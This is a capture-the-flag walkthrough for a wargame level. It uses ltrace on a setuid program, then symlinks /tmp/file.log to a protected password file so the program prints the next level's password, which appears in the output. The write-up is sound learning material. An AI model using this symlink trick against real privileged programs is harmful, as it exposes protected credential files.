# Leviathan 5 - Walkthrough

```
leviathan5@leviathan:~$ ls
leviathan5

leviathan5@leviathan:~$ ./leviathan5
Cannot find /tmp/file.log
```
```
leviathan5@leviathan:~$ ltrace ./leviathan5
__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                                                                           = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                                                                     = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
leviathan5@leviathan:~$ touch /tmp/file.log
leviathan5@leviathan:~$ ltrace ./leviathan5
__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                                                                           = 0x804b008
fgetc(0x804b008)                                                                                      = '\377'
feof(0x804b008)                                                                                       = 1
fclose(0x804b008)                                                                                     = 0
getuid()                                                                                              = 12005
setuid(12005)                                                                                         = 0
unlink("/tmp/file.log")                                                                               = 0
+++ exited (status 0) +++
```
feof checks if it's the end of the file. 
Let's write something to the file:

```
leviathan5@leviathan:~$ echo hello > /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
hello
```
Let's see the flow:

```
leviathan5@leviathan:~$ ltrace ./leviathan5
__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                                                                           = 0x804b008
fgetc(0x804b008)                                                                                      = 'h'
feof(0x804b008)                                                                                       = 0
putchar(104, 0x8048720, 0xf7e40890, 0x80486eb)                                                        = 104
fgetc(0x804b008)                                                                                      = 'e'
feof(0x804b008)                                                                                       = 0
putchar(101, 0x8048720, 0xf7e40890, 0x80486eb)                                                        = 101
fgetc(0x804b008)                                                                                      = 'l'
feof(0x804b008)                                                                                       = 0
putchar(108, 0x8048720, 0xf7e40890, 0x80486eb)                                                        = 108
fgetc(0x804b008)                                                                                      = 'l'
feof(0x804b008)                                                                                       = 0
putchar(108, 0x8048720, 0xf7e40890, 0x80486eb)                                                        = 108
fgetc(0x804b008)                                                                                      = 'o'
feof(0x804b008)                                                                                       = 0
putchar(111, 0x8048720, 0xf7e40890, 0x80486eb)                                                        = 111
fgetc(0x804b008)                                                                                      = '\n'
feof(0x804b008)                                                                                       = 0
putchar(10, 0x8048720, 0xf7e40890, 0x80486ebhello
)                                                         = 10
fgetc(0x804b008)                                                                                      = '\377'
feof(0x804b008)                                                                                       = 1
fclose(0x804b008)                                                                                     = 0
getuid()                                                                                              = 12005
setuid(12005)                                                                                         = 0
unlink("/tmp/file.log")                                                                               = 0
+++ exited (status 0) +++
```

Ok so let's do it for `/etc/leviathan_pass/leviathan6`.
make `/tmp/file.log` a symlink for the above.
Haha!: 

```
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
UgaoFee4li
```
